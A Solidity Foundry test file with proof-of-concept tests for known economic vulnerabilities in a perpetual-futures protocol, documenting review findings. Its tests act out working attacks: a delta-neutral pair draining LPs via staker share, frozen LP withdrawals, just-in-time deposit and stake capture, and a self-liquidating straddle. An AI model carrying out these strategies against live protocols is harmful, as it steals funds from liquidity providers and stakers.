// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {console2} from "forge-std/console2.sol";
import {PerpEngine} from "../src/PerpEngine.sol";
import {MockUSDC} from "./mocks/MockUSDC.sol";
import {Base} from "./Base.t.sol";

/// @notice Proof-of-concept tests for the open findings of the independent review (see SECURITY.md).
///         Each test PASSES while the issue exists: they document accepted or unresolved risks of the
///         current design, most of them consequences of the economic model rather than coding errors.
contract KnownIssuesTest is Base {
    function _bal(address a) internal view returns (uint256) {
        return usdc.balanceOf(a);
    }

    /// @dev Gives `who` real HOUSE by realising a small trading loss, then stakes all of it.
    function _bootstrapStaker(address who) internal {
        _open(who, BTC, true, 100e6, 1_000e6);
        _setBtc(99_000);
        _close(who, BTC);
        _setBtc(100_000);
        uint256 h = house.balanceOf(who);
        assertGt(h, 0);
        vm.prank(who);
        house.stake(h);
    }

    // ───────────────────────── H-01 ─────────────────────────
    /// The 15% staker cut is taken from GROSS trader losses while winners are paid 100% from the house.
    /// A delta-neutral long/short pair therefore moves 15% of |PnL| from LPs to stakers on every price move.
    /// An attacker who is (the dominant) staker extracts it risk-free.
    function test_H01_deltaNeutralPairDrainsLPsThroughStakerShare() public {
        _bootstrapStaker(alice); // alice is the only staker (costs her ~10 USDC of loss)

        uint256 attackerBefore = _bal(alice) + _bal(bob);
        uint256 navBefore = vault.totalAssets();

        // Delta-neutral: alice long 1M, bob short 1M, both 10x.
        _open(alice, BTC, true, 100_000e6, 1_000_000e6);
        _open(bob, BTC, false, 100_000e6, 1_000_000e6);
        assertEq(engine.fundingRate(BTC), 0, "balanced book pays no funding");

        _setBtc(108_000); // +8%: alice +80k, bob -80k. Direction is irrelevant.
        _close(alice, BTC);
        _close(bob, BTC);
        vm.prank(alice);
        house.claimYield();

        uint256 attackerAfter = _bal(alice) + _bal(bob);
        uint256 navAfter = vault.totalAssets();
        console2.log("attacker profit (USDC)", (attackerAfter - attackerBefore) / 1e6);
        console2.log("LP NAV loss     (USDC)", (navBefore - navAfter) / 1e6);

        assertGt(attackerAfter, attackerBefore + 9_000e6, "risk-free profit after all fees");
        assertLt(navAfter, navBefore - 9_000e6, "LPs paid for it");
        _assertEngineSolvent();
    }

    // ───────────────────────── M-01 ─────────────────────────
    /// Losses are capped at margin, profits are not, and there is no insurance / ADL. A 100x straddle is a free
    /// option on any move that outruns liquidators (price gap, FX weekend re-open, feed outage).
    function test_M01_hundredXStraddleProfitsFromGap() public {
        uint256 attackerBefore = _bal(alice) + _bal(bob);
        uint256 navBefore = vault.totalAssets();

        _open(alice, BTC, true, 1_000e6, 100_000e6);
        _open(bob, BTC, false, 1_000e6, 100_000e6);

        _setBtc(103_000); // 3% gap between two consecutive usable prices

        vm.prank(alice);
        engine.liquidate(bob); // self-liquidate the loser, pocket the 2% keeper fee
        _close(alice, BTC);

        uint256 attackerAfter = _bal(alice) + _bal(bob);
        console2.log("straddle profit on 2,000 USDC margin", (attackerAfter - attackerBefore) / 1e6);
        assertGt(attackerAfter, attackerBefore + 1_800e6);
        assertLt(vault.totalAssets(), navBefore - 1_800e6);
    }

    // ───────────────────────── M-02 ─────────────────────────
    /// LP exit is gated by notional OI / 3. A hedged 100x pair pins `reservedLiquidity` at NAV for a one-off fee,
    /// freezing ~99.7% of LP capital for as long as the attacker likes (balanced book => zero funding).
    function test_M02_hedgedOiFreezesAllLpWithdrawals() public {
        skip(LOCK);
        _setBtc(100_000);
        assertEq(vault.maxWithdraw(lp), LP_SEED);

        uint256 before = _bal(alice) + _bal(bob);
        _open(alice, BTC, true, 15_000e6, 1_500_000e6);
        _open(bob, BTC, false, 15_000e6, 1_500_000e6);
        uint256 spent = before - (_bal(alice) + _bal(bob));
        console2.log("capital locked + fees to freeze a 1M vault", spent / 1e6);

        // Only the fee income the attack itself generated (~0.3% of NAV) remains withdrawable.
        console2.log("LP withdrawable of 1,003,000", vault.maxWithdraw(lp) / 1e6);
        assertLt(vault.maxWithdraw(lp), 3_001e6);
        vm.prank(lp);
        vm.expectRevert();
        vault.withdraw(10_000e6, lp, lp);

        // Still frozen a month later; nobody but the attacker can lift it (positions are healthy).
        skip(30 days);
        assertLt(vault.maxWithdraw(lp), 3_001e6);
    }

    // ───────────────────────── M-03 ─────────────────────────
    /// Realised-only NAV + notional-based reserve: an LP who exits before a winning trader closes leaves the
    /// whole loss with the remaining LPs, and the trader's profit is then cut by the shortfall rule.
    function test_M03_lpExitBeforeProfitRealisation_shortfallAndWipeout() public {
        vm.prank(carol);
        vault.deposit(1_000_000e6, carol); // two equal LPs, NAV 2M
        _open(alice, BTC, true, 100_000e6, 2_000_000e6);

        skip(LOCK);
        _setBtc(160_000); // alice unrealised +1.2M; NAV still ~2M

        uint256 lpBefore = _bal(lp);
        vm.startPrank(lp);
        vault.redeem(vault.maxRedeem(lp), lp, lp); // exits at the stale, pre-loss share price
        vm.stopPrank();
        uint256 lpOut = _bal(lp) - lpBefore;
        assertGt(lpOut, 1_000_000e6, "lp leaves with principal plus fee income");

        uint256 aliceBefore = _bal(alice);
        _close(alice, BTC);
        uint256 alicePaid = _bal(alice) - aliceBefore;

        console2.log("lp withdrew          ", lpOut / 1e6);
        console2.log("alice owed profit    ", uint256(1_200_000));
        console2.log("alice shortfall      ", vault.totalShortfall() / 1e6);
        console2.log("carol position value ", vault.convertToAssets(vault.balanceOf(carol)) / 1e6);

        assertGt(vault.totalShortfall(), 190_000e6, "trader not paid in full");
        assertLt(alicePaid, 1_300_000e6 - 190_000e6);
        assertEq(vault.totalAssets(), 0, "remaining LP wiped out");
    }

    // ───────────────────────── M-04 ─────────────────────────
    /// A newcomer deposits right before realising a known trader loss (here: by performing the liquidation
    /// himself) and takes most of a gain that was economically earned by the existing LPs. The lock only delays.
    function test_M04_jitDepositCapturesPendingLiquidation() public {
        _open(alice, BTC, true, 100_000e6, 1_000_000e6);
        _setBtc(91_000); // -9% at 10x: liquidatable, 100k margin about to become NAV

        usdc.mint(carol, 9_000_000e6);
        uint256 carolBefore = _bal(carol);
        uint256 lpValueBefore = vault.convertToAssets(vault.balanceOf(lp));

        vm.startPrank(carol);
        vault.deposit(9_000_000e6, carol);
        engine.liquidate(alice);
        vm.stopPrank();

        skip(LOCK);
        vm.startPrank(carol);
        vault.redeem(vault.balanceOf(carol), carol, carol);
        vm.stopPrank();

        uint256 carolGain = _bal(carol) - carolBefore;
        uint256 lpGain = vault.convertToAssets(vault.balanceOf(lp)) - lpValueBefore;
        console2.log("newcomer gain (incl. 2k keeper fee)", carolGain / 1e6);
        console2.log("incumbent LP gain                  ", lpGain / 1e6);
        assertGt(carolGain, 90_000e6);
        assertLt(lpGain, 10_000e6);
    }

    // ───────────────────────── M-05 ─────────────────────────
    /// A blocklisted trader's healthy position can never be removed: close and TP/SL pay the trader and revert,
    /// liquidation needs a 90% loss, and there is no admin force-close. Its OI reserves LP liquidity forever.
    function test_M05_blocklistedTraderPositionIsPermanent() public {
        skip(LOCK);
        _setBtc(100_000);
        // 1x long: can only be liquidated if BTC falls 90%.
        vm.prank(alice);
        engine.openPosition(
            PerpEngine.OpenParams({
                priceId: BTC,
                isLong: true,
                margin: 1_500_000e6 / 2,
                size: 1_500_000e6 / 2,
                acceptablePrice: 0,
                takeProfit: 120_000e18,
                stopLoss: 80_000e18
            }),
            _noBytes()
        );
        uint64 slId = engine.getPosition(alice, BTC).slOrderId;
        usdc.setBlocklisted(alice, true);

        _setBtc(79_000); // stop-loss level reached, position far from liquidation
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(MockUSDC.Blocklisted.selector, alice));
        engine.closePosition(BTC, 0, _noBytes());
        vm.prank(keeper);
        vm.expectRevert(abi.encodeWithSelector(MockUSDC.Blocklisted.selector, alice));
        engine.executeOrder(slId, _noBytes());
        vm.expectRevert(PerpEngine.NothingToLiquidate.selector);
        engine.liquidate(alice);

        // 750k of notional keeps 250k of LP money locked with no way to clear it.
        assertEq(engine.reservedLiquidity(), 250_000e6);
        assertEq(vault.maxWithdraw(lp), vault.totalAssets() - 250_000e6);
    }

    // ───────────────────────── L-01 ─────────────────────────
    /// A publishTime up to maxPriceAge in the FUTURE is accepted, so the same price stays usable for
    /// 2 * maxPriceAge seconds of chain time, doubling the latency window.
    function test_L01_futurePublishTimeDoublesStalenessWindow() public {
        skip(10);
        uint64 t = uint64(block.timestamp);
        pyth.updatePriceFeeds{value: PYTH_FEE}(_updateData(BTC, 100_000e8, 0, -8, t + 3));
        assertEq(engine.getPrice(BTC).publishTime, t + 3);
        skip(6); // six seconds after it was first usable
        _open(alice, BTC, true, 1_000e6, 10_000e6); // still accepted with maxPriceAge = 3
        assertEq(engine.getPosition(alice, BTC).entryPrice, 100_000e18);
    }

    // ───────────────────────── L-02 ─────────────────────────
    /// maxConfBps (owner may set up to 500) is not tied to leverage. Opens fill at ask, liquidations test at mid,
    /// so with conf >= ~0.9% a 100x position is liquidatable in the block it is opened.
    function test_L02_wideConfidenceMakesHighLeverageOpenInstantlyLiquidatable() public {
        vm.prank(owner);
        engine.setRiskParams(3, 100, 30_000, 5e6);
        _setPrice(BTC, 100_000e8, 1_000e8, -8); // 1% confidence, allowed

        uint256 before = _bal(alice);
        _open(alice, BTC, true, 10_000e6, 1_000_000e6);
        vm.prank(bob);
        assertEq(engine.liquidate(alice), 1); // same block, price unchanged
        assertGt(before - _bal(alice), 10_000e6, "entire margin plus open fee lost at an unchanged price");
    }

    // ───────────────────────── L-05 ─────────────────────────
    /// Staking has no warm-up: HOUSE staked in the same transaction as a liquidation takes a pro-rata share of
    /// that inflow from long-term stakers and can be unstaked immediately.
    function test_L05_jitStakeCapturesLiquidationYield() public {
        _stake(bob, 1_000e18); // long-term staker
        vm.prank(address(engine));
        house.mintLossRebate(carol, 990e6); // carol holds 99,000 idle HOUSE

        _open(alice, BTC, true, 100_000e6, 1_000_000e6);
        _setBtc(91_000);

        uint256 before = _bal(carol);
        uint256 bobBefore = house.earned(bob);
        vm.startPrank(carol);
        house.stake(99_000e18);
        engine.liquidate(alice);
        house.claimYield();
        house.unstake(99_000e18);
        vm.stopPrank();

        uint256 stakerPot = (98_000e6 * 15) / 100;
        uint256 carolYield = _bal(carol) - before - 2_000e6; // minus keeper fee
        assertApproxEqAbs(carolYield, (stakerPot * 99) / 100, 1e6);
        assertLt(house.earned(bob) - bobBefore, stakerPot / 50);
    }

    // ───────────────────────── L-06 ─────────────────────────
    /// The skew surcharge is priced on the end-state skew of each trade, so splitting one trade across
    /// accounts is cheaper than doing it in one piece.
    function test_L06_skewFeeIsReducedBySplittingAcrossAccounts() public {
        uint256 whole = engine.quoteOpenFee(BTC, 1_000_000e6, true);
        uint256 first = engine.quoteOpenFee(BTC, 500_000e6, true);
        _open(alice, BTC, true, 50_000e6, 500_000e6);
        uint256 second = engine.quoteOpenFee(BTC, 500_000e6, true);
        assertEq(whole, 1_500e6);
        assertEq(first + second, 1_250e6);
    }
}
